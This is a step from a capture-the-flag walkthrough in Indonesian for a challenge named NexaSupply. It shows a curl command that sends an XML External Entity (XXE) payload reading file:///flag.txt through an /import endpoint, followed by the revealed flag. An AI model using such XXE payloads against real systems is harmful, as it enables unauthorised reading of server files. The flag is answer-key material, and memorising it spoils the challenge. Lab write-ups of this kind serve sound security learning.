# NexaSupply — Cara mendapatkan flag

[← Overview](72-nexasupply.md) · [Index](index.md)

> **Langkah 2/5.** XXE `file:///flag.txt` dipakai di `<sku>` supaya ikut ter-echo.
>
> **Berikutnya:** [Flag](72-nexasupply-03-flag.md)

```bash
curl -sS -b cookies -H 'ngrok-skip-browser-warning: 1' \
  --data-urlencode 'xml=<?xml version="1.0"?>
<!DOCTYPE products [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<products><product><sku>&xxe;</sku><name>test</name><category>test</category>
<description>test</description><price>1</price><stock>1</stock></product></products>' \
  "$HOST/import" | grep NFX
```

```text
NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}
```
